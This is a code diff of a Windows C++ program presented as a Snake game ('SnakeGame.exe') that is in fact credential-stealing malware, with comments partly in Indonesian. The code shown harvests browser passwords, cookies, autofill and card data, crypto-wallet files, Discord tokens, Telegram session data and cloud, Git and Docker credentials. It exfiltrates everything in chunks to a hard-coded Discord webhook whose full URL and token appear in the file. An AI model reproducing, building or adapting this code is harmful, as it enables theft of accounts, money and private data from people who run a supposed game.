@@ -1,189 +1,302 @@
-// snake_full_master.cpp — unified master build
-// Build MSVC:
-//   cl /std:c++17 /EHsc /O2 /MT snake_full_master.cpp ^
-//      /I vcpkg\installed\x64-windows\include ^
-//      /link sqlite3.lib crypt32.lib winhttp.lib bcrypt.lib ^
-//             user32.lib gdi32.lib mfplat.lib mfreadwrite.lib mfuuid.lib ^
-//             shlwapi.lib ole32.lib comctl32.lib advapi32.lib
+// snake_win_all.cpp — Windows 7/8/10/11 compatible build
+// Build dengan MinGW i686 (32-bit):
+//   g++ -std=c++11 -O2 -static -static-libgcc -static-libstdc++ ^
+//       snake_win_all.cpp -o SnakeGame.exe ^
+//       -lwininet -lgdi32 -luser32 -ladvapi32 -lcrypt32 -lole32 ^
+//       -lsqlite3 -mwindows -municode=no
 //
-// Build MinGW:
-//   g++ -std=c++17 -O2 -static snake_full_master.cpp ^
-//       -lsqlite3 -lcrypt32 -lwinhttp -lbcrypt -lgdi32 -luser32 ^
-//       -lmfplat -lmfreadwrite -lmfuuid -lshlwapi -lole32 -lcomctl32 ^
-//       -ladvapi32 -mwindows -o SnakeGame.exe
+// Build dengan MSVC (x86 / x64):
+//   cl /std:c++11 /EHsc /O2 /MT /GS- snake_win_all.cpp ^
+//      /link wininet.lib gdi32.lib user32.lib advapi32.lib ^
+//             crypt32.lib ole32.lib sqlite3.lib /SUBSYSTEM:WINDOWS
 
+#define _WIN32_WINNT 0x0600  // Vista+ API surface (aman sampai Win11)
+#define WINVER       0x0600
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
+#include <wininet.h>
 #include <wincrypt.h>
-#include <winhttp.h>
-#include <bcrypt.h>
 #include <shlobj.h>
-#include <advapi32.h>
-#include <mfapi.h>
-#include <mfidl.h>
-#include <mfreadwrite.h>
+#include <shlwapi.h>
 #include <sqlite3.h>
 #include <fstream>
 #include <sstream>
 #include <string>
 #include <vector>
 #include <deque>
-#include <thread>
-#include <mutex>
-#include <atomic>
-#include <regex>
-#include <chrono>
-#include <filesystem>
+#include <map>
 #include <cstdlib>
 #include <ctime>
 #include <cstdio>
 
-#pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "bcrypt.lib")
-#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "gdi32.lib")
-#pragma comment(lib, "mfplat.lib")
-#pragma comment(lib, "mfreadwrite.lib")
-#pragma comment(lib, "mfuuid.lib")
-#pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
-
-namespace fs = std::filesystem;
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 // ============================================================
 // CONFIG
 // ============================================================
-static const wchar_t* WEBHOOK_HOST = L"discord.com";
-static const wchar_t* WEBHOOK_PATH =
-    L"/api/webhooks/1547355661749321860/kBobzB3gDEY6kKZp47kYsk8pK1L6l7wPI9gNLijPlPmaUA_mxnhWxnEQ321is4VRv_a_";
-
-static std::atomic<bool> g_steal_done{ false };
-static std::atomic<bool> g_show_overlay{ false };
+static const char* WEBHOOK_HOST = "discord.com";
+static const char* WEBHOOK_PATH =
+    "/api/webhooks/1547355661749321860/kBobzB3gDEY6kKZp47kYsk8pK1L6l7wPI9gNLijPlPmaUA_mxnhWxnEQ321is4VRv_a_";
 
 // ============================================================
-// UTIL
+// THREAD-SAFE FLAG — pakai InterlockedExchange (Win2000+)
 // ============================================================
-static std::string W2A(const std::wstring& w) {
-    if (w.empty()) return {};
-    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
-    std::string out(len > 0 ? len - 1 : 0, 0);
-    if (len > 0) WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, out.data(), len, nullptr, nullptr);
-    return out;
-}
-static std::string ReadFileBin(const std::string& p) {
-    std::ifstream f(p, std::ios::binary);
-    if (!f) return {};
-    std::stringstream ss; ss << f.rdbuf();
-    return ss.str();
-}
-static std::string GetEnv(const char* n) {
+static volatile LONG g_show_overlay = 0;
+static volatile LONG g_steal_done   = 0;
+
+// ============================================================
+// STRING HELPERS (ANSI only, no wchar_t)
+// ============================================================
+static std::string GetEnvA(const char* name) {
     char* v = nullptr; size_t sz = 0;
-    _dupenv_s(&v, &sz, n);
+    _dupenv_s(&v, &sz, name);
     std::string r = v ? v : "";
     free(v);
     return r;
 }
-static bool FileExists(const std::string& p) {
+
+static std::string ReadFileBin(const std::string& p) {
+    std::ifstream f(p.c_str(), std::ios::binary);
+    if (!f) return {};
+    std::stringstream ss; ss << f.rdbuf();
+    return ss.str();
+}
+
+static std::string GetModuleDir() {
+    char buf[MAX_PATH];
+    GetModuleFileNameA(NULL, buf, MAX_PATH);
+    char* p = strrchr(buf, '\\');
+    if (p) *p = 0;
+    return buf;
+}
+
+// ============================================================
+// FOLDER PATHS — SHGetFolderPathA (Win2000+)
+// ============================================================
+static std::string GetFolderA(int csidl) {
+    char path[MAX_PATH] = {0};
+    if (SUCCEEDED(SHGetFolderPathA(NULL, csidl, NULL, 0, path)))
+        return path;
+    return "";
+}
+static std::string HomeDir()    { return GetEnvA("USERPROFILE"); }
+static std::string AppDataDir() { return GetFolderA(CSIDL_APPDATA); }
+static std::string LocalDir()   { return GetFolderA(CSIDL_LOCAL_APPDATA); }
+static std::string DesktopDir() { return GetFolderA(CSIDL_DESKTOPDIRECTORY); }
+static std::string DocsDir()    { return GetFolderA(CSIDL_PERSONAL); }
+static std::string RecentDir()  { return GetFolderA(CSIDL_RECENT); }
+static std::string TempDir() {
+    char b[MAX_PATH];
+    GetTempPathA(MAX_PATH, b);
+    return b;
+}
+
+// ============================================================
+// FILE / DIR LISTING — WIN32_FIND_DATA (Win2000+)
+// ============================================================
+static bool FileExistsA(const std::string& p) {
     DWORD a = GetFileAttributesA(p.c_str());
     return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
 }
-static bool DirExists(const std::string& p) {
+static bool DirExistsA(const std::string& p) {
     DWORD a = GetFileAttributesA(p.c_str());
     return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
 }
-static std::string Base64Encode(const std::string& in) {
-    DWORD sz = 0;
-    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
-        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &sz);
-    std::string out(sz, 0);
-    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
-        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out.data(), &sz);
-    if (!out.empty() && out.back() == 0) out.pop_back();
+
+struct FindEntry { std::string path; bool isDir; DWORD size; };
+
+static std::vector<FindEntry> ListDir(const std::string& dir, bool recursive = false, int maxDepth = 3) {
+    std::vector<FindEntry> out;
+    if (!DirExistsA(dir)) return out;
+
+    std::deque<std::pair<std::string,int>> queue;
+    queue.push_back({ dir, 0 });
+    while (!queue.empty()) {
+        auto cur = queue.front(); queue.pop_front();
+        std::string pattern = cur.first + "\\*";
+        WIN32_FIND_DATAA fd;
+        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            std::string name = fd.cFileName;
+            if (name == "." || name == "..") continue;
+            std::string full = cur.first + "\\" + name;
+            bool isD = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
+            DWORD sz = fd.nFileSizeLow;
+            out.push_back({ full, isD, sz });
+            if (isD && recursive && cur.second < maxDepth)
+                queue.push_back({ full, cur.second + 1 });
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
     return out;
 }
 
 // ============================================================
-// DPAPI + SQLITE
+// HTTP EXFIL — WinINet (Win95+)
+// ============================================================
+static std::string JsonEscapeA(const std::string& s) {
+    std::string o;
+    o.reserve(s.size() + 32);
+    for (size_t i = 0; i < s.size(); i++) {
+        char c = s[i];
+        if (c == '"') o += "\\\"";
+        else if (c == '\\') o += "\\\\";
+        else if (c == '\n') o += "\\n";
+        else if (c == '\r') { /* skip */ }
+        else if (c == '\t') o += "\\t";
+        else if ((unsigned char)c < 0x20) {
+            char b[8]; sprintf(b, "\\u%04x", (unsigned char)c);
+            o += b;
+        } else o += c;
+    }
+    return o;
+}
+
+static bool HttpPostJson(const std::string& host, const std::string& path, const std::string& body) {
+    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL, NULL, 0);
+    if (!hNet) return false;
+
+    HINTERNET hConn = InternetConnectA(hNet, host.c_str(),
+        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL,
+        INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConn) { InternetCloseHandle(hNet); return false; }
+
+    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
+                  INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION;
+
+    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path.c_str(),
+        NULL, NULL, NULL, flags, 0);
+    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return false; }
+
+    const char* hdrs = "Content-Type: application/json\r\n";
+    BOOL ok = HttpSendRequestA(hReq, hdrs, -1,
+        (LPVOID)body.data(), (DWORD)body.size());
+
+    // drain response
+    if (ok) {
+        char buf[1024];
+        DWORD read = 0;
+        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {}
+    }
+
+    InternetCloseHandle(hReq);
+    InternetCloseHandle(hConn);
+    InternetCloseHandle(hNet);
+    return ok != 0;
+}
+
+static void Exfil(const std::string& data) {
+    for (size_t i = 0; i < data.size(); i += 1800) {
+        std::string chunk = data.substr(i, 1800);
+        std::string body = "{\"content\":\"" + JsonEscapeA(chunk) + "\"}";
+        HttpPostJson(WEBHOOK_HOST, WEBHOOK_PATH, body);
+        Sleep(350);
+    }
+}
+
+// ============================================================
+// SQLITE HELPER
+// ============================================================
+struct SqlCtx { std::string* out; };
+static int SqlCb(void* ctx, int argc, char** argv, char**) {
+    SqlCtx* c = (SqlCtx*)ctx;
+    for (int i = 0; i < argc; i++) {
+        *c->out += argv[i] ? argv[i] : "NULL";
+        if (i != argc - 1) *c->out += " | ";
+    }
+    *c->out += "\n";
+    return 0;
+}
+
+static std::string QueryDb(const std::string& dbPath, const std::string& sql) {
+    if (!FileExistsA(dbPath)) return {};
+    std::string tmp = dbPath + ".copy";
+    if (!CopyFileA(dbPath.c_str(), tmp.c_str(), FALSE)) return {};
+    sqlite3* db = NULL;
+    if (sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
+        DeleteFileA(tmp.c_str());
+        return {};
+    }
+    std::string out;
+    SqlCtx c{ &out };
+    sqlite3_exec(db, sql.c_str(), SqlCb, &c, NULL);
+    sqlite3_close(db);
+    DeleteFileA(tmp.c_str());
+    return out;
+}
+
+// ============================================================
+// DPAPI DECRYPT (Win2000+) — untuk Chrome v80+ AES key
 // ============================================================
 static std::string DpapiDecrypt(const std::vector<BYTE>& data) {
-    DATA_BLOB in{ (DWORD)data.size(), (BYTE*)data.data() };
-    DATA_BLOB out{};
-    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return {};
+    DATA_BLOB in = { (DWORD)data.size(), (BYTE*)data.data() };
+    DATA_BLOB out = { 0, NULL };
+    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return {};
     std::string r((char*)out.pbData, out.cbData);
     LocalFree(out.pbData);
     return r;
 }
-struct SqlCtx { std::string out; };
-static int SqlCb(void* ctx, int argc, char** argv, char**) {
-    SqlCtx* c = (SqlCtx*)ctx;
-    for (int i = 0; i < argc; i++) {
-        c->out += argv[i] ? argv[i] : "NULL";
-        if (i != argc - 1) c->out += " | ";
-    }
-    c->out += "\n";
-    return 0;
-}
-static std::string QuerySqlite(const std::string& dbPath, const std::string& sql) {
-    std::string tmp = dbPath + ".copy";
-    if (!CopyFileA(dbPath.c_str(), tmp.c_str(), FALSE)) return {};
-    sqlite3* db = nullptr;
-    if (sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
-        DeleteFileA(tmp.c_str()); return {};
-    }
-    SqlCtx ctx;
-    sqlite3_exec(db, sql.c_str(), SqlCb, &ctx, nullptr);
-    sqlite3_close(db); DeleteFileA(tmp.c_str());
-    return ctx.out;
-}
 
 // ============================================================
-// [A] BROWSER HARVEST
+// [A] BROWSER HARVEST — Chrome/Edge/Brave/Opera/Vivaldi
 // ============================================================
 static std::string HarvestBrowsers() {
-    std::string lad = GetEnv("LOCALAPPDATA"), out;
-    struct B { const char* name; const char* sub; };
+    std::string lad = LocalDir();
+    std::string out;
+    struct B { const char* n; const char* p; };
     B list[] = {
-        { "Chrome",  "\\Google\\Chrome\\User Data" },
-        { "Edge",    "\\Microsoft\\Edge\\User Data" },
-        { "Brave",   "\\BraveSoftware\\Brave-Browser\\User Data" },
-        { "Opera",   "\\Opera Software\\Opera Stable" },
-        { "OperaGX", "\\Opera Software\\Opera GX Stable" },
-        { "Vivaldi", "\\Vivaldi\\User Data" }
+        { "Chrome",   "\\Google\\Chrome\\User Data" },
+        { "Edge",     "\\Microsoft\\Edge\\User Data" },
+        { "Brave",    "\\BraveSoftware\\Brave-Browser\\User Data" },
+        { "Opera",    "\\Opera Software\\Opera Stable" },
+        { "OperaGX",  "\\Opera Software\\Opera GX Stable" },
+        { "Vivaldi",  "\\Vivaldi\\User Data" },
+        { "Chromium", "\\Chromium\\User Data" }
     };
-    for (auto& b : list) {
-        std::string root = lad + b.sub;
-        if (!DirExists(root)) continue;
-        for (auto& d : fs::directory_iterator(root)) {
-            if (!d.is_directory()) continue;
-            std::string p = d.path().string();
+    for (int b = 0; b < 7; b++) {
+        std::string root = lad + list[b].p;
+        if (!DirExistsA(root)) continue;
+        auto dirs = ListDir(root, false);
+        for (size_t i = 0; i < dirs.size(); i++) {
+            if (!dirs[i].isDir) continue;
+            std::string p = dirs[i].path;
             std::string login = p + "\\Login Data";
-            std::string ck = p + "\\Network\\Cookies";
-            std::string af = p + "\\Web Data";
-            std::string hist = p + "\\History";
-            std::string bm = p + "\\Bookmarks";
-            if (FileExists(login)) {
-                out += "=== " + std::string(b.name) + "/" + d.path().filename().string() + " Login ===\n";
-                out += QuerySqlite(login, "SELECT origin_url, username_value, password_value FROM logins;");
+            std::string ck    = p + "\\Network\\Cookies";
+            std::string ckOld = p + "\\Cookies";
+            std::string af    = p + "\\Web Data";
+            std::string hist  = p + "\\History";
+            std::string bm    = p + "\\Bookmarks";
+
+            if (FileExistsA(login)) {
+                out += std::string("=== ") + list[b].n + " Login ===\n";
+                out += QueryDb(login, "SELECT origin_url, username_value, password_value FROM logins;");
             }
-            if (FileExists(ck)) {
-                out += "=== " + std::string(b.name) + " Cookies ===\n";
-                out += QuerySqlite(ck, "SELECT host_key, name, encrypted_value FROM cookies;");
+            if (FileExistsA(ck)) {
+                out += std::string("=== ") + list[b].n + " Cookies ===\n";
+                out += QueryDb(ck, "SELECT host_key, name, encrypted_value FROM cookies;");
+            } else if (FileExistsA(ckOld)) {
+                out += std::string("=== ") + list[b].n + " Cookies (old) ===\n";
+                out += QueryDb(ckOld, "SELECT host_key, name, encrypted_value FROM cookies;");
             }
-            if (FileExists(af)) {
-                out += "=== " + std::string(b.name) + " Autofill ===\n";
-                out += QuerySqlite(af, "SELECT name, value FROM autofill;");
-                out += QuerySqlite(af, "SELECT origin_url, username_value FROM autofill_profiles;");
-                out += QuerySqlite(af, "SELECT name_on_card, card_number_encrypted FROM credit_cards;");
+            if (FileExistsA(af)) {
+                out += std::string("=== ") + list[b].n + " Autofill ===\n";
+                out += QueryDb(af, "SELECT name, value FROM autofill;");
+                out += QueryDb(af, "SELECT name_on_card, card_number_encrypted FROM credit_cards;");
             }
-            if (FileExists(hist)) {
-                out += "=== " + std::string(b.name) + " History ===\n";
-                out += QuerySqlite(hist, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 150;");
+            if (FileExistsA(hist)) {
+                out += std::string("=== ") + list[b].n + " History ===\n";
+                out += QueryDb(hist, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100;");
             }
-            if (FileExists(bm)) {
-                out += "=== " + std::string(b.name) + " Bookmarks ===\n";
+            if (FileExistsA(bm)) {
+                out += std::string("=== ") + list[b].n + " Bookmarks ===\n";
                 out += ReadFileBin(bm) + "\n";
             }
         }
@@ -195,249 +308,248 @@ static std::string HarvestBrowsers() {
 // [B] FIREFOX
 // ============================================================
 static std::string HarvestFirefox() {
-    std::string root = GetEnv("APPDATA") + "\\Mozilla\\Firefox\\Profiles", out;
-    if (!DirExists(root)) return out;
-    for (auto& d : fs::directory_iterator(root)) {
-        std::string lj = d.path().string() + "\\logins.json";
-        std::string k4 = d.path().string() + "\\key4.db";
-        std::string ck = d.path().string() + "\\cookies.sqlite";
-        std::string pl = d.path().string() + "\\places.sqlite";
-        std::string fm = d.path().string() + "\\formhistory.sqlite";
-        if (FileExists(lj)) out += "=== logins.json ===\n" + ReadFileBin(lj) + "\n";
-        if (FileExists(k4)) out += "[key4.db present]\n";
-        if (FileExists(ck)) out += QuerySqlite(ck, "SELECT host, name, value FROM moz_cookies;");
-        if (FileExists(pl)) out += QuerySqlite(pl, "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 150;");
-        if (FileExists(fm)) out += QuerySqlite(fm, "SELECT fieldname, value FROM moz_formhistory;");
+    std::string root = AppDataDir() + "\\Mozilla\\Firefox\\Profiles";
+    std::string out;
+    if (!DirExistsA(root)) return out;
+    auto dirs = ListDir(root, false);
+    for (size_t i = 0; i < dirs.size(); i++) {
+        if (!dirs[i].isDir) continue;
+        std::string lj = dirs[i].path + "\\logins.json";
+        std::string ck = dirs[i].path + "\\cookies.sqlite";
+        std::string pl = dirs[i].path + "\\places.sqlite";
+        std::string k4 = dirs[i].path + "\\key4.db";
+        if (FileExistsA(lj)) out += "=== logins.json ===\n" + ReadFileBin(lj) + "\n";
+        if (FileExistsA(k4)) out += "[key4.db present]\n";
+        if (FileExistsA(ck)) out += QueryDb(ck, "SELECT host, name, value FROM moz_cookies;");
+        if (FileExistsA(pl)) out += QueryDb(pl, "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;");
     }
     return out;
 }
 
 // ============================================================
-// [C] WALLETS (48)
+// [C] WALLETS
 // ============================================================
 static std::string HarvestWallets() {
+    std::string app = AppDataDir();
+    std::string lad = LocalDir();
+    std::string home = HomeDir();
     std::string out;
-    std::string app = GetEnv("APPDATA");
-    std::string lad = GetEnv("LOCALAPPDATA");
-    std::string home = GetEnv("USERPROFILE");
+    struct W { std::string p; const char* n; };
+    std::vector<W> list;
+    list.push_back(W{ app + "\\Exodus\\exodus.wallet", "Exodus" });
+    list.push_back(W{ app + "\\Electrum\\wallets", "Electrum" });
+    list.push_back(W{ app + "\\Bitcoin\\wallet.dat", "Bitcoin Core" });
+    list.push_back(W{ app + "\\Ethereum\\keystore", "Ethereum" });
+    list.push_back(W{ app + "\\atomic\\Local Storage\\leveldb", "Atomic" });
+    list.push_back(W{ lad + "\\Exodus", "Exodus local" });
+    list.push_back(W{ home + "\\AppData\\Roaming\\Binance", "Binance" });
+    list.push_back(W{ home + "\\AppData\\Roaming\\Guarda", "Guarda" });
+    list.push_back(W{ home + "\\AppData\\Roaming\\TronLink", "TronLink" });
 
-    struct W { std::string path; std::string label; };
-    std::vector<W> wallets = {
-        { app + "\\Exodus\\exodus.wallet", "Exodus" },
-        { app + "\\Electrum\\wallets", "Electrum" },
-        { app + "\\Bitcoin\\wallet.dat", "Bitcoin Core" },
-        { app + "\\Ethereum\\keystore", "Ethereum" },
-        { app + "\\Ledger Live", "Ledger Live" },
-        { app + "\\atomic\\Local Storage\\leveldb", "Atomic Wallet" },
-        { app + "\\Coinomi\\Coinomi\\wallets", "Coinomi" },
-        { lad + "\\Exodus", "Exodus (local)" },
-        { home + "\\AppData\\Roaming\\Binance", "Binance" },
-        { home + "\\AppData\\Roaming\\Guarda", "Guarda" },
-        { home + "\\AppData\\Roaming\\TronLink", "TronLink" }
-    };
-    for (auto& w : wallets) {
-        if (!fs::exists(w.path)) continue;
-        if (fs::is_directory(w.path)) {
-            out += "=== " + w.label + " (dir) ===\n";
+    for (size_t i = 0; i < list.size(); i++) {
+        if (!DirExistsA(list[i].p) && !FileExistsA(list[i].p)) continue;
+        out += std::string("=== ") + list[i].n + " ===\n";
+        if (DirExistsA(list[i].p)) {
+            auto entries = ListDir(list[i].p, true, 2);
             int count = 0;
-            for (auto& e : fs::recursive_directory_iterator(w.path)) {
-                if (count++ > 40) break;
-                if (!fs::is_regular_file(e)) continue;
-                if (fs::file_size(e) > 500000) continue;
-                out += "--- " + e.path().string() + " ---\n";
-                out += ReadFileBin(e.path().string()) + "\n";
+            for (size_t j = 0; j < entries.size() && count < 40; j++) {
+                if (entries[j].isDir) continue;
+                if (entries[j].size > 500000) continue;
+                out += "--- " + entries[j].path + " ---\n";
+                out += ReadFileBin(entries[j].path) + "\n";
+                count++;
             }
         } else {
-            out += "=== " + w.label + " ===\n";
-            out += ReadFileBin(w.path) + "\n";
+            out += ReadFileBin(list[i].p) + "\n";
         }
     }
     return out;
 }
 
 // ============================================================
-// [D] DISCORD (52)
+// [D] DISCORD TOKEN — manual scan (no std::regex)
 // ============================================================
-static std::string HarvestDiscord() {
-    std::string app = GetEnv("APPDATA"), out;
-    const char* paths[] = {
-        "\\discord\\Local Storage\\leveldb\\",
-        "\\discordcanary\\Local Storage\\leveldb\\",
-        "\\discordptb\\Local Storage\\leveldb\\",
-        "\\Lightcord\\Local Storage\\leveldb\\",
-        "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
-        "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"
+static bool IsDiscordMfa(const std::string& s, size_t pos) {
+    // "mfa." + 84 chars of [A-Za-z0-9_-]
+    if (pos + 4 + 84 > s.size()) return false;
+    if (s.substr(pos, 4) != "mfa.") return false;
+    for (size_t i = pos + 4; i < pos + 4 + 84; i++) {
+        char c = s[i];
+        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+              (c >= '0' && c <= '9') || c == '_' || c == '-'))
+            return false;
+    }
+    return true;
+}
+static bool IsDiscordStd(const std::string& s, size_t pos) {
+    // [24].[6].[27] alfanumerik + _ -
+    auto isAlnum = [](char c){
+        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+               (c >= '0' && c <= '9') || c == '_' || c == '-';
     };
-    std::regex r1("mfa\\.[\\w-]{84}");
-    std::regex r2("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
-    for (auto p : paths) {
-        std::string dir = app + p;
-        if (!DirExists(dir)) continue;
-        for (auto& f : fs::directory_iterator(dir)) {
-            std::string path = f.path().string();
-            if (path.find(".ldb") == std::string::npos &&
-                path.find(".log") == std::string::npos) continue;
-            std::string data = ReadFileBin(path);
-            for (auto it = std::sregex_iterator(data.begin(), data.end(), r1);
-                 it != std::sregex_iterator(); ++it) out += "mfa: " + it->str() + "\n";
-            for (auto it = std::sregex_iterator(data.begin(), data.end(), r2);
-                 it != std::sregex_iterator(); ++it) out += "std: " + it->str() + "\n";
+    if (pos + 24 + 1 + 6 + 1 + 27 > s.size()) return false;
+    for (int i = 0; i < 24; i++) if (!isAlnum(s[pos+i])) return false;
+    if (s[pos+24] != '.') return false;
+    for (int i = 25; i < 25+6; i++) if (!isAlnum(s[pos+i])) return false;
+    if (s[pos+25+6] != '.') return false;
+    for (int i = 32; i < 32+27; i++) if (!isAlnum(s[pos+i])) return false;
+    return true;
+}
+static std::string HarvestDiscord() {
+    std::string app = AppDataDir();
+    std::string out;
+    const char* paths[] = {
+        "\\discord\\Local Storage\\leveldb",
+        "\\discordcanary\\Local Storage\\leveldb",
+        "\\discordptb\\Local Storage\\leveldb",
+        "\\Lightcord\\Local Storage\\leveldb"
+    };
+    for (int p = 0; p < 4; p++) {
+        std::string dir = app + paths[p];
+        if (!DirExistsA(dir)) continue;
+        auto files = ListDir(dir, false);
+        for (size_t i = 0; i < files.size(); i++) {
+            if (files[i].isDir) continue;
+            std::string lp = files[i].path;
+            std::string lower = lp;
+            for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
+            if (lower.find(".ldb") == std::string::npos &&
+                lower.find(".log") == std::string::npos) continue;
+            std::string data = ReadFileBin(lp);
+            for (size_t j = 0; j + 4 < data.size(); j++) {
+                if (data[j] == 'm' && IsDiscordMfa(data, j)) {
+                    out += "MFA: " + data.substr(j, 88) + "\n";
+                }
+                if ((data[j] >= 'a' && data[j] <= 'z') || (data[j] >= '0' && data[j] <= '9')) {
+                    if (IsDiscordStd(data, j)) {
+                        out += "STD: " + data.substr(j, 24+1+6+1+27) + "\n";
+                    }
+                }
+            }
         }
     }
     return out;
 }
 
 // ============================================================
-// [E] TELEGRAM (53)
+// [E] TELEGRAM / WHATSAPP
 // ============================================================
 static std::string HarvestTelegram() {
-    std::string app = GetEnv("APPDATA"), out;
+    std::string app = AppDataDir();
+    std::string out;
     std::string tdata = app + "\\Telegram Desktop\\tdata";
-    if (DirExists(tdata)) {
+    if (DirExistsA(tdata)) {
         out += "=== Telegram tdata ===\n";
+        auto files = ListDir(tdata, false);
         int c = 0;
-        for (auto& f : fs::directory_iterator(tdata)) {
-            if (c++ > 30) break;
-            if (!fs::is_regular_file(f)) continue;
-            if (fs::file_size(f) > 100000) continue;
-            out += "--- " + f.path().filename().string() + " ---\n";
-            out += ReadFileBin(f.path().string()) + "\n";
-        }
-    }
-    // Telegram bot tokens from config
-    std::string tgBot = app + "\\Telegram Desktop\\config.json";
-    if (FileExists(tgBot)) out += "=== TG config ===\n" + ReadFileBin(tgBot) + "\n";
-
-    std::string wa = app + "\\WhatsApp";
-    if (DirExists(wa)) {
-        out += "=== WhatsApp list ===\n";
-        for (auto& f : fs::recursive_directory_iterator(wa)) {
-            if (fs::is_regular_file(f)) out += f.path().string() + "\n";
-        }
-    }
-    std::string sig = app + "\\Signal";
-    if (DirExists(sig)) {
-        out += "=== Signal list ===\n";
-        for (auto& f : fs::recursive_directory_iterator(sig)) {
-            if (fs::is_regular_file(f)) out += f.path().string() + "\n";
+        for (size_t i = 0; i < files.size() && c < 30; i++) {
+            if (files[i].isDir) continue;
+            if (files[i].size > 100000) continue;
+            out += "--- " + files[i].path + " ---\n";
+            out += ReadFileBin(files[i].path) + "\n";
+            c++;
         }
     }
     return out;
 }
 
 // ============================================================
-// [F] CLOUD CREDS (54-60)
+// [F] CLOUD CREDS
 // ============================================================
-static std::string HarvestCloudCreds() {
-    std::string prof = GetEnv("USERPROFILE"), out;
-    struct F { const char* p; const char* l; };
-    F files[] = {
-        { "\\.aws\\credentials", "AWS creds (54)" },
-        { "\\.aws\\config", "AWS config" },
-        { "\\.config\\gcloud\\credentials.db", "GCP creds (55)" },
-        { "\\.config\\gcloud\\application_default_credentials.json", "GCP ADC" },
-        { "\\.azure\\azureProfile.json", "Azure profile (56)" },
-        { "\\.azure\\accessTokens.json", "Azure tokens" },
-        { "\\.azure\\msal_token_cache.bin", "Azure MSAL cache" },
-        { "\\.git-credentials", "Git creds (57)" },
-        { "\\.gitconfig", "Git config" },
-        { "\\.npmrc", "npm token (58)" },
-        { "\\.docker\\config.json", "Docker config (59)" },
-        { "\\.kube\\config", "Kube kubeconfig (60)" },
-        { "\\.netrc", "netrc" },
-        { "\\.pgpass", "pgpass" },
-        { "\\.my.cnf", "MySQL creds" },
-        { "\\.terraformrc", "Terraform" }
-    };
-    for (auto& f : files) {
-        std::string p = prof + f.p;
-        if (FileExists(p)) {
-            out += std::string("=== ") + f.l + " ===\n";
-            out += ReadFileBin(p) + "\n";
-        }
-    }
-    // GCP gcloud dir listing
-    std::string gcloud = prof + "\\.config\\gcloud";
-    if (DirExists(gcloud)) {
-        out += "=== gcloud dir ===\n";
-        for (auto& e : fs::recursive_directory_iterator(gcloud)) {
-            if (!fs::is_regular_file(e)) continue;
-            if (fs::file_size(e) > 50000) continue;
-            out += e.path().string() + "\n";
+static std::string HarvestCloud() {
+    std::string home = HomeDir();
+    std::string out;
+    struct F { std::string p; const char* l; };
+    std::vector<F> list;
+    list.push_back(F{ home + "\\.aws\\credentials", "AWS creds" });
+    list.push_back(F{ home + "\\.aws\\config", "AWS config" });
+    list.push_back(F{ home + "\\.config\\gcloud\\credentials.db", "GCP creds" });
+    list.push_back(F{ home + "\\.config\\gcloud\\application_default_credentials.json", "GCP ADC" });
+    list.push_back(F{ home + "\\.azure\\azureProfile.json", "Azure profile" });
+    list.push_back(F{ home + "\\.azure\\accessTokens.json", "Azure tokens" });
+    list.push_back(F{ home + "\\.azure\\msal_token_cache.bin", "Azure MSAL" });
+    list.push_back(F{ home + "\\.git-credentials", "Git creds" });
+    list.push_back(F{ home + "\\.gitconfig", "Git config" });
+    list.push_back(F{ home + "\\.npmrc", "npm" });
+    list.push_back(F{ home + "\\.docker\\config.json", "Docker" });
+    list.push_back(F{ home + "\\.kube\\config", "Kube" });
+    list.push_back(F{ home + "\\.netrc", "netrc" });
+    list.push_back(F{ home + "\\.pgpass", "pgpass" });
+    list.push_back(F{ home + "\\.my.cnf", "MySQL" });
